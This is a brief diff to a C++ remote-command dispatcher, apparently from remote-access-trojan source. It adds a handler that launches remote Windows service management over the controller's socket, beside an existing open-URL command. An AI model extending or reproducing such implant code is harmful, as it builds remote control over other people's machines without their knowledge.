@@ -94,6 +94,10 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 			(LPVOID)(lpBuffer + 1), 0, NULL, true);
 		Sleep(100);					// 传递参数用
 		break;
+	case COMMAND_SERVICES: // 服务管理
+		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ServicesManager,
+			(LPVOID)m_pClient->m_Socket, 0, NULL);
+		break;
 	case COMMAND_OPEN_URL_SHOW:		// 显示打开网页
 		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
 		break;
